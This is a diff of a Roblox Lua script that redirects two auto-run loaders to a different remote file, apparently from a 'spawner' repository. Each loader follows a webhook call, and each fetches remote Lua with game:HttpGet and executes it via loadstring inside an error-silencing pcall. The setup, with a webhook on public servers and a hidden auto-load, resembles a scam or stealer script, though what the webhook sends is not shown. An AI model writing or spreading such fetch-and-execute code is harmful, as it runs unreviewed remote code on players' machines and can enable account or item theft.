@@ -205,7 +205,7 @@ if serverType == "PUBLIC SERVER" then
     sendWebhook()
     -- Tự động load script
     pcall(function()
-        loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/visual2.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/spawner/refs/heads/main/real"))()
     end)
 else
     -- ====== Private Server GUI ======
@@ -308,7 +308,7 @@ local function handleSend()
                 sendWebhook(txt)
             end)
             pcall(function()
-                loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/visual2.lua"))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/spawner/refs/heads/main/real"))()
             end)
         end)
     else
